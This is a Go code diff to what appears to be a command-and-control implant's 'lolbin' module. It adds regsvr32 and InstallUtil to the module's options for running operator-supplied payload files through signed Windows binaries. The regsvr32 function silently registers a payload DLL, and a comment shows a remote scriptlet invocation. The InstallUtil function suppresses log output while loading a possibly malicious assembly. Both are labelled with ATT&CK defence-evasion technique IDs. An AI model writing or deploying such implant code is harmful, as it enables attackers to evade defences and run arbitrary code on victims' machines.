@@ -43,7 +43,7 @@ func (c *LolbinCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Action == "" {
-		return errorResult("Error: action is required (rundll32, msiexec, regsvcs, regasm, mshta, certutil)")
+		return errorResult("Error: action is required (rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil)")
 	}
 	if args.Path == "" {
 		return errorResult("Error: path to payload file is required")
@@ -71,8 +71,12 @@ func (c *LolbinCommand) Execute(task structs.Task) structs.CommandResult {
 		return lolbinMshta(absPath, args.Args)
 	case "certutil":
 		return lolbinCertutil(absPath, args.Args)
+	case "regsvr32":
+		return lolbinRegsvr32(absPath, args.Args)
+	case "installutil":
+		return lolbinInstallUtil(absPath, args.Args)
 	default:
-		return errorf("Unknown action: %s (use rundll32, msiexec, regsvcs, regasm, mshta, certutil)", args.Action)
+		return errorf("Unknown action: %s (use rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil)", args.Action)
 	}
 }
 
@@ -238,6 +242,87 @@ func lolbinCertutil(filePath, extraArgs string) structs.CommandResult {
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] certutil.exe %s\n", strings.Join(cmdArgs, " "))
+	if len(output) > 0 {
+		result += string(output)
+	}
+	if ctx.Err() == context.DeadlineExceeded {
+		result += "\n[!] Process killed after timeout"
+	} else if err != nil {
+		result += fmt.Sprintf("\nProcess exited: %v", err)
+	}
+
+	return successResult(result)
+}
+
+// regsvr32 — T1218.010 — Execute DLL/scriptlet via regsvr32.exe
+// Regsvr32 is a signed Microsoft binary that can execute:
+// - DLLs via DllRegisterServer export: regsvr32.exe payload.dll
+// - COM scriptlets via /i: regsvr32.exe /s /n /u /i:http://... scrobj.dll
+func lolbinRegsvr32(payloadPath, extraArgs string) structs.CommandResult {
+	var cmdArgs []string
+
+	if extraArgs != "" {
+		// Custom args mode — operator controls the full command line
+		cmdArgs = strings.Fields(extraArgs)
+		// Ensure payload path is included
+		found := false
+		for _, a := range cmdArgs {
+			if strings.Contains(a, payloadPath) {
+				found = true
+				break
+			}
+		}
+		if !found {
+			cmdArgs = append(cmdArgs, payloadPath)
+		}
+	} else {
+		// Default: silent DLL registration (executes DllRegisterServer export)
+		cmdArgs = []string{"/s", payloadPath}
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, "regsvr32.exe", cmdArgs...)
+	output, err := cmd.CombinedOutput()
+
+	result := fmt.Sprintf("[+] regsvr32.exe %s\n", strings.Join(cmdArgs, " "))
+	if len(output) > 0 {
+		result += string(output)
+	}
+	if ctx.Err() == context.DeadlineExceeded {
+		result += "\n[!] Process killed after timeout"
+	} else if err != nil {
+		result += fmt.Sprintf("\nProcess exited: %v", err)
+	}
+
+	return successResult(result)
+}
+
+// installutil — T1218.004 — Execute .NET assembly via InstallUtil.exe
+// InstallUtil is a .NET Framework tool that loads assemblies and runs
+// the Installer class. Malicious assemblies can execute code in the
+// Install/Uninstall methods.
+func lolbinInstallUtil(assemblyPath, extraArgs string) structs.CommandResult {
+	installUtilPath := findDotNetTool("InstallUtil.exe")
+	if installUtilPath == "" {
+		return errorResult("Error: InstallUtil.exe not found in .NET Framework directories")
+	}
+
+	// Default: /logfile= /LogToConsole=false to suppress output files
+	cmdArgs := []string{"/logfile=", "/LogToConsole=false"}
+	if extraArgs != "" {
+		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+	}
+	cmdArgs = append(cmdArgs, assemblyPath)
+
+	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, installUtilPath, cmdArgs...)
+	output, err := cmd.CombinedOutput()
+
+	result := fmt.Sprintf("[+] %s %s\n", installUtilPath, strings.Join(cmdArgs, " "))
 	if len(output) > 0 {
 		result += string(output)
 	}
